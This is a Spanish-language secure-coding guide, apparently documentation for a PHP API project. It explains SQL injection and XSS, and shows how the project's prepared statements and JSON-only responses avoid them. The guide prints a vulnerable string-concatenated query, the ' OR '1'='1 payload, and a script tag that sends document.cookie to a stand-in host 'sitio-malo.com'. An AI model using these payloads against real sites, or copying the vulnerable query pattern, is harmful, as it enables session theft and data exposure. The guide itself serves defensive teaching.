# Inyección SQL y XSS: qué son y cómo se evitan acá

Estos dos ataques aparecen en cualquier lista de "seguridad web básica", y
conviene entenderlos de memoria porque son de los más viejos y más
explotados. Los dos comparten la misma idea de fondo: **un dato que mandó el
usuario termina siendo interpretado como código**, en vez de como dato.

## Inyección SQL (SQL injection)

### El problema

Imaginate una consulta armada así, pegando el texto directo:

```php
// MAL — NUNCA HACER ESTO
$sql = "SELECT * FROM usuarios WHERE email = '" . $_POST['email'] . "'";
```

Si alguien manda como email el texto `' OR '1'='1`, la consulta que termina
ejecutando el motor de base de datos es:

```sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1'
```

`'1'='1'` es siempre verdadero, así que la condición completa es siempre
verdadera: la consulta devuelve **todos** los usuarios de la tabla, no
ninguno en particular. Con variantes de esta misma idea se puede además
borrar tablas, robar contraseñas, o loguearse sin saber ninguna clave.

El nombre "inyección" es literal: el atacante *inyecta* código SQL propio
adentro de la consulta, aprovechando que el programa no distinguió entre "el
texto que escribió el usuario" y "el código SQL que se va a ejecutar".

### La solución: consultas preparadas

```php
// BIEN
$sql = "SELECT * FROM usuarios WHERE email = :email";
$query = $connection->prepare($sql);
$query->execute([':email' => $email]);
```

Acá pasan dos cosas separadas: primero el motor recibe y entiende el SQL
(con `:email` como un espacio vacío, un placeholder), y **después** recibe el
valor de `$email` por otro canal, ya no como texto que hay que interpretar
sino como un dato plano. No importa lo que el usuario haya escrito adentro
—aunque sea `' OR '1'='1`— el motor lo va a tratar siempre como el valor
literal del email, nunca como código SQL. Es imposible "escaparse" de la
consulta.

### Dónde está esto en el proyecto

Los repositories (`ProductRepository`, `UserRepository`, en `nivel-1/` y
`nivel-2/`) hablan con MySQL de verdad, con PDO, y usan consultas
preparadas en TODAS partes, sin excepción:

```php
$sql = 'SELECT * FROM productos WHERE id = :id';
$query = $this->db->prepare($sql);
$query->execute([':id' => $id]);
```

## Cross-Site Scripting (XSS)

### El problema

Pasa cuando una aplicación **muestra** en una página HTML un dato que vino
del usuario, sin tratarlo con cuidado. Ejemplo típico: un campo de
comentarios que guarda lo que la gente escribe y después lo muestra a todo
el mundo.

Si alguien escribe como comentario:

```html
<script>document.location = 'https://sitio-malo.com/robar?cookie=' + document.cookie</script>
```

Y la página lo inserta directo en el HTML sin escapar, el navegador de
**cualquiera que vea ese comentario** va a ejecutar ese script como si fuera
parte legítima de la página. Con eso se pueden robar sesiones, redirigir a
sitios falsos, o modificar lo que ve la víctima.

En `nivel-2`, la cookie del JWT usa `HttpOnly`, así que `document.cookie` no
puede leerla. Eso reduce el robo directo del token, aunque XSS sigue siendo
peligroso: un script malicioso todavía podría realizar acciones desde la
página de la víctima. Por eso el frontend igualmente debe evitar insertar
HTML sin escapar.

Hay tres variantes conocidas (**reflejado**: el script viaja en la URL del
pedido y rebota en la respuesta; **almacenado**: el script queda guardado en
la base y se sirve a cada visitante, como el ejemplo de arriba; **DOM**:
ocurre enteramente en JavaScript del navegador, sin pasar por el servidor),
pero la idea de fondo es siempre la misma: HTML/JS ajeno terminó
ejecutándose donde no debía.

### Por qué esta API en particular no es vulnerable a esto

Esta API **nunca genera HTML**. Todo lo que responde pasa por
[Response.php](../nivel-2/core/Response.php), que arma JSON:

```php
header('Content-Type: application/json; charset=utf-8');
echo json_encode($body, ...);
```

Un navegador nunca interpreta JSON como código: lo trata como texto plano.
Aunque guardes `<script>...</script>` como nombre de un producto, la API lo
va a guardar tal cual y lo va a devolver tal cual dentro de un JSON. No hay
manera de que eso, saliendo de acá, se ejecute como script.

### Entonces, ¿dónde SÍ hay que cuidarse de XSS?

En el **frontend** — la página o app que consume esta API y se encarga de
mostrar esos datos como HTML. Ahí sí hay que tener cuidado. La buena noticia
es que los frameworks modernos ya lo hacen solos: en React, por ejemplo,
`{producto.nombre}` escapa el texto automáticamente. El peligro aparece
cuando alguien usa a propósito algo como `dangerouslySetInnerHTML` (React) o
`innerHTML` (JavaScript puro) para insertar HTML sin escapar.

**La regla general, y por qué en esta API no "limpiamos" la entrada:** la
práctica moderna es *sanitizar en la salida*, no en la entrada. Es decir: no
le cortamos ni le modificamos al usuario lo que escribió al guardarlo (eso
además podría arruinar datos legítimos, como alguien que de verdad quiere
escribir sobre HTML en una descripción), sino que quien **muestra** ese dato
después es responsable de escaparlo según el medio donde lo va a mostrar
(HTML, un log, un PDF...).

## Resumen para no errarle

| | Inyección SQL | XSS |
|---|---|---|
| ¿Qué se cuela? | código SQL ajeno | HTML/JavaScript ajeno |
| ¿Dónde se ejecuta? | en la base de datos | en el navegador de la víctima |
| ¿Cómo se evita? | consultas preparadas (parámetros aparte del SQL) | escapar al mostrar HTML |
| ¿Aplica hoy en esta API? | sí, y ya está resuelto (consultas preparadas en todos los repositories) | no (la API solo devuelve JSON, nunca HTML) |
| ¿Quién tiene que cuidarse? | el repository | el frontend que consuma esta API |
